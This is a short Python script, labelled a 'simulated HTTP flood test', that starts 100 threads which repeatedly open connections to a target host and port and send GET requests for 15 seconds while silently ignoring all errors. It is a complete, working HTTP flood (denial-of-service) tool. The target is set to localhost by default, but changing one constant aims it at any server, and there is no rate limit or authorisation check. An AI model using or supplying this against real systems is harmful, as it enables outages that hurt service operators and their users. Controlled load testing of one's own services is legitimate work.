import socket
import threading
import time
import requests

TARGET_IP = "127.0.0.1"  
TARGET_PORT = 8000          
NUM_THREADS = 100           

def send_traffic():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n"
            s.send(request.encode('utf-8'))
            s.close()
        except:
            pass 

print(f"Starting simulated HTTP flood test against {TARGET_IP}:{TARGET_PORT}...")

for x in range(NUM_THREADS):
    thread = threading.Thread(target=send_traffic)
    thread.daemon = True
    thread.start()

time.sleep(15) 
print("Simulation complete.")
